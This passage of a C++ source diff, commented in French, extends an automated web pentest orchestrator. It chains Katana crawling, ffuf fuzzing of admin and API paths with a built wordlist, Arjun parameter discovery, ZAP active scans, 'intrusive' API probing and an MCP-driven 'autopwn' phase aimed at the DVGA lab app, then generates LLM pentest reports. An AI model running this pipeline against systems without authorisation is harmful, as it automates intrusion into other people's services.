             (workdir / "api_catalog_prioritized.json").string(),
             mcp_out
         );
     } catch (...) {
-        // silencieux si échec
+        // silencieux
     }
 }
 
@@ -7768,9 +9922,17 @@ static bool run_recon_web_chain(const std::string& baseurl,
 {
     produced_files.clear();
 
-    const std::string host    = extract_hostname(baseurl);          // ex: "example.com"
-    const std::string scheme  = (baseurl.rfind("https://", 0) == 0) ? "https" : "http";
-    const std::string webroot = scheme + "://" + host + "/";
+    // host = version "safe" pour les noms de fichiers (example.com, dvga_5013, etc.)
+    const std::string host   = extract_hostname(baseurl);
+
+    // netloc = ce qui apparaît dans l’URL (example.com, dvga:5013, etc.)
+    const std::string netloc = extract_netloc(baseurl);
+
+    // http / https
+    const std::string scheme = (baseurl.rfind("https://", 0) == 0) ? "https" : "http";
+
+    // webroot = ce qui sera passé à dirb/httpx/etc. → utilise netloc (important pour les ports !)
+    const std::string webroot = scheme + "://" + netloc + "/";
 
     auto write_out = [&](const fs::path& outpath, const std::string& content){
         try {
@@ -7784,6 +9946,8 @@ static bool run_recon_web_chain(const std::string& baseurl,
     };
 
     loginfo(std::string(ansi::sky) + "[RECON] Chain start on " + host + ansi::reset);
+    produced_files.clear();
+
 
     // ---------- 1) DIG (A/AAAA/NS/MX) ----------
     loginfo(std::string(ansi::sky) + "[RECON] DNS: résolution A/AAAA/NS/MX avec dig..." + ansi::reset);
@@ -8517,6 +10681,19 @@ static bool zap_ascan_as_user(const AgentOptions &opt,
     return true;
 }
 
+// Simple helper pour écrire un fichier dans le workdir
+static bool write_out(const std::filesystem::path &p, const std::string &content) {
+    try {
+        std::ofstream ofs(p, std::ios::binary);
+        if (!ofs) return false;
+        ofs << content;
+        return true;
+    } catch (...) {
+        return false;
+    }
+}
+
+
 // -----------------------------------------------------------------------------
 // Orchestrateur Web (ZAP-CLI + MCP) — avec intégration Katana optionnelle
 // ET fallback robuste si MCP ne fournit pas d'URLs
@@ -8536,6 +10713,20 @@ static bool run_agentfactory(const AgentOptions &opt){
         logerr(std::string("Failed to create output dir: ") + ex.what());
         return false;
     }
+
+    // 1) Phase DVGA GraphQL autopwn (si baseurl pointe DVGA)
+    /*
+    bool dvga_autopwn = (opt.baseurl.find("dvga") != std::string::npos);
+    if (dvga_autopwn) {
+        loginfo(std::string(ansi::yellow) +
+                "[DVGA] GraphQL autopwn pre-phase enabled on baseurl=" + opt.baseurl +
+                ansi::reset);
+
+        bool ok_dvga = run_graphql_autopwn_mcp(opt, workdir);
+        if (!ok_dvga) {
+            logerr("[DVGA] run_graphql_autopwn_mcp failed (continuing with standard AgentFactory pipeline).");
+        }
+    }*/
 
     std::cout << ansi::green << "Workdir:" << ansi::reset
               << " " << ansi::white << workdir.string() << ansi::reset << std::endl;
@@ -8634,6 +10825,10 @@ static bool run_agentfactory(const AgentOptions &opt){
         if (seen.insert(u).second) vec.push_back(u);
     };
 
+
+    // stocke tous les CSV ffuf générés (root, api, admin, v1)
+    std::vector<fs::path> ffuf_csv_files;
+
     // -------------------------------------------------------------
     // 1) Katana FIRST: découverte + filtre des URLs qui répondent
     // -------------------------------------------------------------
@@ -8641,7 +10836,7 @@ static bool run_agentfactory(const AgentOptions &opt){
     std::unordered_set<std::string> seen_ok;
 
     if (g_use_katana) {
-        std::cout << ansi::green << "[KATANA] Start crawling (first)..." << ansi::reset << std::endl;
+        std::cout << ansi::green << "[KATANA] Start crawling (first)." << ansi::reset << std::endl;
 
         const std::string katana_bin = resolve_katana_bin(g_katana_bin_explicit);
         std::string so, se;
@@ -8650,14 +10845,16 @@ static bool run_agentfactory(const AgentOptions &opt){
         if (!run_katana_to_file(katana_bin, opt.baseurl, g_katana_passthrough, katana_out, so, se)) {
             logerr("[KATANA] execution failed — continuing without Katana URLs.");
         } else {
-            // Charge et filtre par code HTTP
+            // -----------------------------------------------
+            // 1.a) Filtrage Katana par code HTTP
+            // -----------------------------------------------
             std::string ktxt = readFile(katana_out.string());
             std::istringstream iss(ktxt);
-            std::string line; int tested=0, okcnt=0;
+            std::string line; 
+            int tested = 0, okcnt = 0;
 
             while (std::getline(iss, line)) {
                 if (line.size() < 10) continue;
-                // Petit nettoyage (espaces)
                 while (!line.empty() && (line.back()=='\r' || line.back()==' ')) line.pop_back();
                 if (line.empty()) continue;
 
@@ -8669,16 +10866,296 @@ static bool run_agentfactory(const AgentOptions &opt){
                 }
             }
 
-            // Sauvegarde liste filtrée
+            // Sauvegarde liste filtrée (Katana ONLY pour le moment)
             try {
                 std::ofstream okf(workdir / "recon_katana_urls_ok.txt");
                 for (auto &u : katana_urls_ok) okf << u << "\n";
-            } catch(...) {}
+            } catch (...) {}
 
             std::vector<std::pair<std::string,std::string>> rows;
             rows.emplace_back("Katana discovered (raw)", std::to_string(tested));
             rows.emplace_back("Katana OK (2xx/3xx)", std::to_string((int)katana_urls_ok.size()));
             print_kv_table(rows, {"Katana discovered (raw)","Katana OK (2xx/3xx)"});
+
+            // -----------------------------------------------
+            // 1.b) Wordlist dynamique pour ffuf à partir des URLs Katana
+            // -----------------------------------------------
+            auto build_dynamic_wordlist_from_urls = [&](const std::vector<std::string> &urls) -> fs::path {
+                using std::string;
+                std::vector<string> tokens;
+
+                auto push_token = [&](string t){
+                    if (t.empty()) return;
+                    // normalisation
+                    std::transform(t.begin(), t.end(), t.begin(),
+                                   [](unsigned char c){ return (char)std::tolower(c); });
+                    if (t.size() < 2 || t.size() > 64) return;
+                    bool alldig = true;
+                    for (char c : t) {
+                        if (!std::isdigit((unsigned char)c)) { alldig = false; break; }
+                    }
+                    if (alldig) return;
+                    tokens.push_back(t);
+                };
+
+                for (const auto &u : urls) {
+                    if (u.size() < 10) continue;
+                    auto pu = parse_url(u);
+                    std::string merged = pu.path;
+                    if (!pu.query.empty()) {
+                        merged.push_back('?');
+                        merged += pu.query;
+                    }
+
+                    auto parts = split_tokens(merged, "/\\?&=.:;,_-#");
+                    for (auto &p : parts) push_token(p);
+
+                    // host hints (api, v1, etc.)
+                    if (!pu.host.empty()) {
+                        auto hparts = split_tokens(pu.host, ".-");
+                        for (auto &h : hparts) push_token(h);
+                    }
+                }
+
+                // Mots-clés supplémentaires "classiques" pour API/admin
+                const char* static_words[] = {
+                    // API / versions / RPC
+                    "api","apis","apiv1","apiv2","apiv3",
+                    "v1","v2","v3","v4",
+                    "rest","rpc","soap","ws","webservice","services",
+                    "graphql","gql","playground","voyager","graphiql",
+
+                    // Auth / session / compte
+                    "auth","oauth","oidc",
+                    "login","logout","signin","signup","register","registration",
+                    "callback","redirect","consent",
+                    "user","users","account","accounts","profile","me",
+                    "session","sessions","token","tokens","refresh","password","reset","forgot",
+
+                    // Admin / backoffice
+                    "admin","administrator","backend","backoffice","manager","console",
+                    "dashboard","panel","cp","cms",
+
+                    // E-commerce / domaine métier courant
+                    "cart","basket","checkout","order","orders",
+                    "product","products","item","items","shop","store","catalog","inventory",
+                    "payment","payments","invoice","billing","subscription","subscriptions",
+
+                    // Fichiers / upload / download
+                    "upload","uploads","file","files","media",
+                    "download","downloads","export","import","report","reports","logs","log",
+
+                    // Recherche / filtres
+                    "search","query","filter","filters","find","lookup","browse","list","lists",
+
+                    // Config / debug / health
+                    "config","configs","configuration","settings","preferences",
+                    "debug","test","tests","testing","qa","staging","dev","development",
+                    "health","healthcheck","status","metrics","info","version","env",
+
+                    // Sécurité / contrôle d’accès
+                    "acl","roles","permissions","policy","policies","security","adminonly",
+
+                    // Java / Spring / JEE
+                    "spring","springboot","actuator","jmx","servlet","jsp","servlets",
+                    "struts","jsf","jaxrs","resteasy","jersey",
+
+                    // PHP / CMS / frameworks
+                    "php","phpinfo","phpmyadmin",
+                    "wp","wpadmin","wpcontent","wplogin",
+                    "wordpress","drupal","joomla","prestashop","magento",
+                    "laravel","symfony","codeigniter","yii","cakephp",
+
+                    // Static / assets / front
+                    "assets","static","public","dist","build","bundle",
+                    "js","javascript","css","img","image","images","fonts",
+
+                    // API business génériques
+                    "customer","customers","client","clients",
+                    "company","companies","project","projects",
+                    "ticket","tickets","support","help","contact","contacts",
+
+                    // Webhooks / intégrations / misc
+                    "webhook","webhooks","hook","hooks",
+                    "integration","integrations","slack","github","gitlab","bitbucket",
+                    "sso","saml","ldap","kerberos",
+
+                    // Divers fréquents
+                    "home","index","main","api2","mobile","internal","private","publicapi",
+                    "legacy","old","archive","beta","alpha"
+                };
+
+                for (auto *w : static_words) tokens.emplace_back(w);
+
+                uniq_prune(tokens, 10000);
+
+                std::string host = extract_hostname(opt.baseurl);
+                if (host.empty()) host = "target";
+                for (char &c : host) {
+                    if (!(std::isalnum((unsigned char)c) || c=='-' || c=='_')) c = '_';
+                }
+
+                fs::path wl = workdir / ("dynamic_" + host + "_paths.txt");
+                try {
+                    std::ofstream ofs(wl);
+                    for (auto &t : tokens) ofs << t << "\n";
+                    loginfo(std::string(ansi::sky) + "[KATANA/FFUF] Dynamic wordlist written: " 
+                            + wl.string() + " (" + std::to_string(tokens.size()) + " entries)" + ansi::reset);
+                } catch (...) {
+                    logerr("[KATANA/FFUF] Cannot write dynamic wordlist: " + wl.string());
+                }
+                return wl;
+            };
+
+            fs::path dynamic_wordlist;
+            if (!katana_urls_ok.empty()) {
+                dynamic_wordlist = build_dynamic_wordlist_from_urls(katana_urls_ok);
+            }
+
+            // -----------------------------------------------
+            // 1.c) FFUF Round 1 : fuzzing intelligent sur /, /api, /admin, /v1
+            // -----------------------------------------------
+#ifndef _WIN32
+            if (!dynamic_wordlist.empty() && fs::exists(dynamic_wordlist)) {
+                std::string base_root = opt.baseurl;
+                while (!base_root.empty() && base_root.back()=='/') base_root.pop_back();
+
+                std::vector<std::string> bases = {"", "api", "admin", "v1"};
+
+                for (const auto &b : bases) {
+                    std::string label = b.empty() ? "root" : b;
+                    fs::path outcsv = workdir / ("recon_ffuf_" + label + ".csv");
+
+                    std::string target;
+                    if (b.empty()) {
+                        target = base_root + "/FUZZ";
+                    } else {
+                        target = base_root + "/" + b + "/FUZZ";
+                    }
+
+                    std::ostringstream cmd;
+                    cmd << "ffuf"
+                        << " -u " << quote(target)
+                        << " -w " << quote(dynamic_wordlist.string())
+                        // On garde tout ce qui répond (200–599)...
+                        << " -mc 200-599"
+                        // ... sauf les 404 qu'on ne veut jamais voir
+                        << " -fc 404"
+                        << " -recursion -recursion-depth 2"
+                        << " -of csv -o " << quote(outcsv.string());
+
+                    std::string so_ffuf, se_ffuf;
+                    loginfo(std::string(ansi::sky) + "[FFUF] Fuzzing " + target 
+                            + " with " + dynamic_wordlist.string() + ansi::reset);
+                    run_command_capture(cmd.str(), so_ffuf, se_ffuf, 0, false);
+                    write_out(workdir / ("recon_ffuf_" + label + "_stdout.txt"), so_ffuf + "\n" + se_ffuf);
+                    ffuf_csv_files.push_back(outcsv);
+                }
+
+                // Merge des résultats FFUF dans katana_urls_ok
+                for (const auto &csvpath : ffuf_csv_files) {
+                    if (!fs::exists(csvpath)) continue;
+                    try {
+                        std::ifstream ifs(csvpath);
+                        std::string l;
+                        bool first = true;
+                        while (std::getline(ifs, l)) {
+                            if (first) { first = false; continue; } // header
+                            if (l.empty()) continue;
+
+                            // 1ère colonne = valeur FUZZ (token)
+                            std::string token;
+                            size_t pos = l.find(',');
+                            if (pos == std::string::npos) token = l;
+                            else token = l.substr(0, pos);
+
+                            // strip guillemets éventuels
+                            if (!token.empty() && token.front()=='"') token.erase(0,1);
+                            if (!token.empty() && token.back()=='"') token.pop_back();
+                            if (token.empty()) continue;
+
+                            // Déduire le label à partir du nom de fichier
+                            std::string label;
+                            auto s = csvpath.filename().string();
+                            if (s.find("recon_ffuf_root") != std::string::npos) label = "";
+                            else if (s.find("recon_ffuf_api") != std::string::npos) label = "api";
+                            else if (s.find("recon_ffuf_admin") != std::string::npos) label = "admin";
+                            else if (s.find("recon_ffuf_v1") != std::string::npos) label = "v1";
+
+                            std::string full = base_root;
+                            if (label.empty()) {
+                                full += "/" + token;
+                            } else {
+                                full += "/" + label + "/" + token;
+                            }
+
+                            int code2 = http_status(full);
+                            if (is_good_code(code2)) {
+                                dedup_push(seen_ok, katana_urls_ok, full);
+                            }
+                        }
+                    } catch (...) {
+                        logerr("[FFUF] Failed to parse CSV: " + csvpath.string());
+                    }
+                }
+
+                // Re-dump avec URLs Katana + FFUF
+                try {
+                    std::ofstream okf2(workdir / "recon_katana_urls_ok.txt");
+                    for (auto &u : katana_urls_ok) okf2 << u << "\n";
+                } catch (...) {}
+            } else {
+                loginfo("[FFUF] Skipping fuzzing (empty or missing dynamic wordlist).");
+            }
+#else
+            (void)dynamic_wordlist; // pas de ffuf sous Windows pour l'instant
+#endif
+
+            // -----------------------------------------------
+            // 1.d) ARJUN : découverte de paramètres HTTP
+            // -----------------------------------------------
+#ifndef _WIN32
+            if (!katana_urls_ok.empty()) {
+                fs::path arjun_out = workdir / "recon_arjun_params.txt";
+                std::ostringstream cmd;
+                cmd << "arjun"
+                    << " -i " << quote((workdir / "recon_katana_urls_ok.txt").string())
+                    << " -oT " << quote(arjun_out.string());
+
+                std::string so_arj, se_arj;
+                loginfo(std::string(ansi::sky) + "[ARJUN] Discovering parameters from Katana/FFUF URLs" + ansi::reset);
+                run_command_capture(cmd.str(), so_arj, se_arj, 0, false);
+                write_out(workdir / "recon_arjun_stdout.txt", so_arj + "\n" + se_arj);
+
+                // Best-effort : extraire des URLs complètes de recon_arjun_params.txt et les merger
+                if (fs::exists(arjun_out)) {
+                    try {
+                        std::ifstream ifs(arjun_out);
+                        std::string l;
+                        while (std::getline(ifs, l)) {
+                            if (l.find("http://") == std::string::npos &&
+                                l.find("https://") == std::string::npos) continue;
+                            size_t pos = l.find("http");
+                            size_t end = l.find(' ', pos);
+                            std::string url = (end == std::string::npos) ? l.substr(pos) : l.substr(pos, end-pos);
+                            while (!url.empty() && (url.back()=='\r' || url.back()==' ')) url.pop_back();
+                            if (url.empty()) continue;
+
+                            int code3 = http_status(url);
+                            if (is_good_code(code3)) {
+                                dedup_push(seen_ok, katana_urls_ok, url);
+                            }
+                        }
+
+                        // Re-dump final Katana+FFUF+ARJUN
+                        std::ofstream okf3(workdir / "recon_katana_urls_ok.txt");
+                        for (auto &u : katana_urls_ok) okf3 << u << "\n";
+                    } catch (...) {
+                        logerr("[ARJUN] Failed to merge Arjun URLs into Katana OK list.");
+                    }
+                }
+            }
+#endif
         }
     }
 
@@ -8782,6 +11259,30 @@ static bool run_agentfactory(const AgentOptions &opt){
 
     // Wayback fusion plus tard
     std::string wayback_txt = readFile((workdir/"recon_waybackurls.txt").string());
+        // -------------------------------------------------------------
+    // 4bis) Phase API : REST / GraphQL / Gateway (flows heuristiques)
+    // -------------------------------------------------------------
+    if (g_intrusive_mode) {
+        loginfo(std::string(ansi::bold) +
+                "[API] Phase REST/GraphQL heuristique (flow principal)..." +
+                ansi::reset);
+
+        std::vector<ConfirmationCommand> api_plan;
+        nlohmann::json api_plan_json = nlohmann::json::object();
+
+        append_api_flows(opt.baseurl, workdir, api_plan, api_plan_json);
+
+        if (!api_plan.empty()) {
+            std::vector<fs::path> api_outputs;
+            execute_confirmation_plan(api_plan, workdir, api_outputs);
+
+            // Consolidation API (REST/GraphQL/gateway) pour les rapports
+            analyse_postexploit_results_api(opt.baseurl, workdir);
+        } else {
+            loginfo("[API] Aucun endpoint REST/GraphQL exploitable detecte.");
+        }
+    }
+
 
     // -------------------------------------------------------------
     // 5) Phase MCP (+ fallback) pour construire la targetlist d'AScan
@@ -8830,19 +11331,109 @@ static bool run_agentfactory(const AgentOptions &opt){
     }
 
     // Merge des URLs Katana OK (priorisées), déduplication
+    // Merge FFUF + ARJUN + KATANA in MCP targetlist
     {
         std::unordered_set<std::string> seen;
-        for (auto &e : mcp_j["urls"]) if (e.contains("url")) seen.insert(e["url"].get<std::string>());
-        int added=0;
-        for (const auto& u : katana_urls_ok) {
-            if (seen.insert(u).second) {
-                mcp_j["urls"].push_back(json{{"url", u}, {"justification", "Discovered via katana (OK)"}}); 
-                added++;
+
+        // Import déjà existant
+        if (mcp_j.contains("urls") && mcp_j["urls"].is_array()) {
+            for (auto &e : mcp_j["urls"]) {
+                if (e.contains("url")) seen.insert(e["url"].get<std::string>());
             }
         }
-        if (added>0) {
-            try { std::ofstream ofs(mcp_urls); ofs << std::setw(2) << mcp_j; } catch(...) {}
-            std::cout << ansi::green << "[KATANA] Merged " << added << " Katana OK URLs into target list" << ansi::reset << std::endl;
+
+        int added_ffuf = 0;
+        int added_arjun = 0;
+        int added_katana = 0;
+
+        // ------------------------------------------------------------
+        // 1) Merge FFUF (toutes les CSV recon_ffuf_*.csv)
+        // ------------------------------------------------------------
+        for (const auto& csvpath : ffuf_csv_files)
+        {
+            if (!fs::exists(csvpath)) continue;
+
+            std::ifstream ifs(csvpath);
+            std::string line;
+            bool first = true;
+
+            // base_root = opt.baseurl stabilisé
+            std::string base_root = opt.baseurl;
+            while (!base_root.empty() && base_root.back() == '/') base_root.pop_back();
+
+            while (std::getline(ifs, line)) {
+                if (first) { first = false; continue; }
+                if (line.empty()) continue;
+
+                // token = premier champ CSV
+                std::string token = line.substr(0, line.find(','));
+                if (token.empty()) continue;
+
+                std::string full = base_root + "/" + token;
+
+                if (seen.insert(full).second) {
+                    mcp_j["urls"].push_back({
+                        {"url", full},
+                        {"justification", "Discovered via FFUF"}
+                    });
+                    added_ffuf++;
+                }
+            }
+        }
+
+        // ------------------------------------------------------------
+        // 2) Merge ARJUN (recon_arjun_params.txt)
+        // ------------------------------------------------------------
+        fs::path arjun_out = workdir / "recon_arjun_params.txt";
+        if (fs::exists(arjun_out)) {
+            std::ifstream ifs(arjun_out);
+            std::string l;
+
+            while (std::getline(ifs, l)) {
+                size_t pos = l.find("http");
+                if (pos == std::string::npos) continue;
+
+                std::string url = l.substr(pos);
+                while (!url.empty() && (url.back()=='\r' || url.back()==' ')) url.pop_back();
+
+                if (url.empty()) continue;
+
+                if (seen.insert(url).second) {
+                    mcp_j["urls"].push_back({
+                        {"url", url},
+                        {"justification", "Discovered via ARJUN"}
+                    });
+                    added_arjun++;
+                }
+            }
+        }
+
+        // ------------------------------------------------------------
+        // 3) Merge KATANA OK
+        // ------------------------------------------------------------
+        for (const auto& u : katana_urls_ok) {
+            if (seen.insert(u).second) {
+                mcp_j["urls"].push_back({
+                    {"url", u},
+                    {"justification", "Discovered via Katana (OK)"}
+                });
+                added_katana++;
+            }
+        }
+
+        // Logging combiné
+        std::cout << ansi::green
+                << "[+] Added " << added_katana << " Katana URLs, "
+                << added_ffuf << " FFUF URLs, "
+                << added_arjun << " ARJUN URLs to MCP list"
+                << ansi::reset << std::endl;
+
+        // Sauvegarde finale
+        try {
+            std::ofstream ofs(mcp_urls);
+            ofs << std::setw(2) << mcp_j;
+        } catch(...) {
+            logerr("Failed to write merged MCP URL file");
         }
     }
 
@@ -8880,15 +11471,21 @@ static bool run_agentfactory(const AgentOptions &opt){
     std::vector<std::string> all_targets;
     all_targets.reserve(mcp_j["urls"].size());
 
-    for (const auto &entry : mcp_j["urls"]) {
-        if (!entry.contains("url")) continue;
+    // Petit helper commun pour éviter le copier/coller
+    auto process_target_entry = [&](const nlohmann::json &entry) {
+        if (!entry.contains("url")) return;
+
         std::string target = entry.value("url", std::string());
-        all_targets.push_back(target);
+        if (target.empty()) return;
 
         std::string justification = entry.value("justification", std::string());
+        all_targets.push_back(target);
+
         print_target_box(target, justification);
 
-        // Scan global (non auth) via ZAP-CLI, comme avant
+        // -------------------------------------------------------------
+        // 1) Scan global (non auth) via ZAP-CLI — pour TOUTES les URLs
+        // -------------------------------------------------------------
         std::string out2, err2;
         bool ok_ascan = run_zapcli_ascan_progress(
             opt.zapcli_path, opt.host, opt.port, opt.apikey,
@@ -8896,13 +11493,79 @@ static bool run_agentfactory(const AgentOptions &opt){
         );
         if (!ok_ascan) {
             logerr("ZAP-CLI ascan failed for target: " + target);
-            continue;
+            return; // pas d'API flow si le scan de base foire
         }
 
         fs::path latest_alerts_after = find_latest_alerts_json(workdir);
-        if (!latest_alerts_after.empty()) last_active_alerts = latest_alerts_after;
+        if (!latest_alerts_after.empty()) {
+            last_active_alerts = latest_alerts_after;
+        }
 
+        // -------------------------------------------------------------
+        // 2) Flows API (REST / GraphQL / Gateway)
+        //    → UNIQUEMENT pour les URLs issues de FFUF
+        // -------------------------------------------------------------
+        bool is_ffuf = (justification.find("FFUF") != std::string::npos);
+
+        if (is_ffuf) {
+            std::cout << ansi::sky
+                    << "[API] Building REST/GraphQL flow for FFUF target "
+                    << target << ansi::reset << std::endl;
+
+            std::vector<ConfirmationCommand> api_plan;
+            nlohmann::json api_plan_json = nlohmann::json::object();
+
+            // On passe bien la target (URL MCP) à l'orchestrateur API
+            append_api_flows(target, workdir, api_plan, api_plan_json);
+
+            if (!api_plan.empty()) {
+                std::cout << ansi::sky
+                        << "[API] Executing " << api_plan.size()
+                        << " API probes for FFUF target "
+                        << target << ansi::reset << std::endl;
+
+                std::vector<fs::path> api_outputs;
+                execute_confirmation_plan(api_plan, workdir, api_outputs);
+
+                analyse_postexploit_results_api(target, workdir);
+
+                std::cout << ansi::green
+                        << "[API] Completed API flows for FFUF target "
+                        << target << ansi::reset << std::endl;
+            } else {
+                std::cout << ansi::yellow
+                        << "[API] No REST/GraphQL surface detected for FFUF target "
+                        << target << ansi::reset << std::endl;
+            }
+        } else {
+            // Juste un scan ZAP classique, pas de surcharge API
+            std::cout << ansi::blue
+                    << "[API] Skipping API flows for non-FFUF target "
+                    << target << ansi::reset << std::endl;
+        }
+
+        // Throttle léger
         std::this_thread::sleep_for(std::chrono::milliseconds(250));
+    };
+
+    // -------------------------------------------------------------
+    // PASS 1 : traiter d'abord toutes les URLs FFUF
+    // -------------------------------------------------------------
+    for (const auto &entry : mcp_j["urls"]) {
+        std::string justification = entry.value("justification", std::string());
+        if (justification.find("Discovered via FFUF") == std::string::npos)
+            continue;
+        process_target_entry(entry);
+    }
+
+    // -------------------------------------------------------------
+    // PASS 2 : traiter ensuite toutes les autres URLs (Katana, Arjun, Wayback...)
+    // -------------------------------------------------------------
+    for (const auto &entry : mcp_j["urls"]) {
+        std::string justification = entry.value("justification", std::string());
+        if (justification.find("Discovered via FFUF") != std::string::npos)
+            continue;
+        process_target_entry(entry);
     }
 
     // ---------------- Authenticated Active Scan (scanAsUser) ----------------
@@ -8963,8 +11626,48 @@ static bool run_agentfactory(const AgentOptions &opt){
         }
     }
 
+    /*
+    // ==========================================================
+    // PHASE API : REST / GraphQL / Gateway dans le flow principal
+    // ==========================================================
+    {
+        loginfo(std::string(ansi::bold) +
+                "[API] Phase REST/GraphQL heuristique (flow principal)..." +
+                ansi::reset);
+
+        std::vector<ConfirmationCommand> api_plan;
+        nlohmann::json api_plan_json = nlohmann::json::object();
+
+        // Réutilise le même orchestrateur que le mode post-exploit,
+        // mais ici on ne se limite qu'aux flows API.
+        append_api_flows(opt.baseurl, workdir, api_plan, api_plan_json);
+
+        if (!api_plan.empty()) {
+            std::vector<std::filesystem::path> api_outputs;
+            execute_confirmation_plan(api_plan, workdir, api_outputs);
+
+            // Consolidation API -> api_catalog.json, api_*_findings.json, etc.
+            analyse_postexploit_results_api(opt.baseurl, workdir);
+        } else {
+            loginfo("[API] Aucun endpoint REST/GraphQL exploitable detecte.");
+        }
+    }*/
+
     // -------------------------------------------------------------
-    // 7) Final: table, rapports MCP (CLI + HTML)
+    // 7) Phase AUTOPWN WEB/API via MCP (après tous les scans)
+    // -------------------------------------------------------------
+    if (!opt.mcp_path.empty()) {
+        loginfo(std::string(ansi::bold) +
+                "[MCP] API/Web autopwn phase (run_api_web_autopwn_mcp)..." +
+                ansi::reset);
+        bool ok_autopwn = run_api_web_autopwn_mcp(opt, workdir);
+        if (!ok_autopwn) {
+            logerr("[MCP] run_api_web_autopwn_mcp failed (continuing with report generation).");
+        }
+    }
+   
+    // -------------------------------------------------------------
+    // 8) Final: table, rapports MCP (CLI + HTML)
     // -------------------------------------------------------------
     std::cout << ansi::green << "[+] Saving..." << ansi::reset << std::endl;
     std::vector<std::pair<std::string,std::string>> rows;
@@ -8987,20 +11690,35 @@ static bool run_agentfactory(const AgentOptions &opt){
 
     if (!msg_files.empty()) {
         rows.push_back({"Proof of Exploit", msg_files[0].filename().string()});
-        for (size_t i = 1; i < msg_files.size(); ++i) rows.push_back({"", msg_files[i].filename().string()});
+        for (size_t i = 1; i < msg_files.size(); ++i)
+            rows.push_back({"", msg_files[i].filename().string()});
     } else {
         rows.push_back({"Proof of Exploit", std::string("(none)")});
     }
     print_kv_table(rows, std::unordered_set<std::string>{"active alerts", "Proof of Exploit"});
 
-    // Rapports
+    // -------------------------------------------------------------
+    // Construction de la liste des fichiers pour prompt-rapport.txt
+    // -------------------------------------------------------------
     std::vector<fs::path> report_files;
-    for (const auto &p : msg_files) report_files.push_back(p);
-    for (const auto &p : recon_files) report_files.push_back(p);
+    for (const auto &p : msg_files)        report_files.push_back(p);
+    for (const auto &p : recon_files)      report_files.push_back(p);
+
+    // Ajouter les logs d'autopwn MCP s'ils existent
+    //fs::path dvga_mcp_raw     = workdir / "dvga_mcp_raw.log";
+    //fs::path dvga_steps       = workdir / "dvga_steps.log";
+    //fs::path dvga_history_txt = workdir / "dvga_mcp_history.txt";
+    fs::path dvga_prompt      = workdir / "dvga_prompt.txt";
+
+    //if (fs::exists(dvga_mcp_raw))     report_files.push_back(dvga_mcp_raw);
+    //if (fs::exists(dvga_steps))       report_files.push_back(dvga_steps);
+    //if (fs::exists(dvga_history_txt)) report_files.push_back(dvga_history_txt);
+    if (fs::exists(dvga_prompt))      report_files.push_back(dvga_prompt);
 
     fs::path latest_alert_file = find_latest_alerts_json(workdir);
     if (report_files.empty()) {
-        if (!latest_alert_file.empty()) report_files.push_back(latest_alert_file);
+        if (!latest_alert_file.empty())
+            report_files.push_back(latest_alert_file);
         else {
             logerr("No message_*.json or alerts file available to generate report; skipping report generation.");
             loginfo("All MCP-targeted active scans launched and raw outputs saved to: " + workdir.string());
@@ -9008,10 +11726,16 @@ static bool run_agentfactory(const AgentOptions &opt){
         }
     }
 
-    // CLI/text report
+    // CLI/text report via prompt-rapport.txt
     std::string report_cli_raw;
     std::cout << ansi::green << "[+] Pentest report generation (CLI)..." << ansi::reset << std::endl;
-    if (!call_mcp_report_with_files(opt.mcp_path, get_exe_parent_dir(), report_files, "prompt-rapport.txt", report_cli_raw)) {
+    if (!call_mcp_report_with_files(
+            opt.mcp_path,
+            get_exe_parent_dir(),
+            report_files,
+            "prompt-rapport.txt",
+            report_cli_raw))
+    {
         logerr("Failed to generate CLI report via prompt-rapport.txt (continuing)");
     }
 
@@ -9030,6 +11754,12 @@ static bool run_agentfactory(const AgentOptions &opt){
         md_report_files.push_back(latest_alert_file);
     }
 
+    // On ajoute aussi les logs d'autopwn dans le rapport Markdown
+    //if (fs::exists(dvga_mcp_raw))     md_report_files.push_back(dvga_mcp_raw);
+    //if (fs::exists(dvga_steps))       md_report_files.push_back(dvga_steps);
+    //if (fs::exists(dvga_history_txt)) md_report_files.push_back(dvga_history_txt);
+    if (fs::exists(dvga_prompt))      md_report_files.push_back(dvga_prompt);
+
     if (!md_report_files.empty()) {
         std::string report_md_raw;
         if (!call_mcp_report_with_files(
@@ -9043,7 +11773,7 @@ static bool run_agentfactory(const AgentOptions &opt){
             logerr("Failed to generate Markdown report via prompt-rapport-md.txt");
         } else {
             std::cout << ansi::green << "[+] Markdown Pentest report generation DONE"
-                    << ansi::reset << std::endl;
+                      << ansi::reset << std::endl;
 
             std::vector<std::pair<std::string,std::string>> rows2;
             rows2.push_back({"Markdown report", md_out.string()});
@@ -9054,7 +11784,6 @@ static bool run_agentfactory(const AgentOptions &opt){
     } else {
         loginfo("Markdown report skipped due to missing input files.");
     }
-
 
     return true;
 }
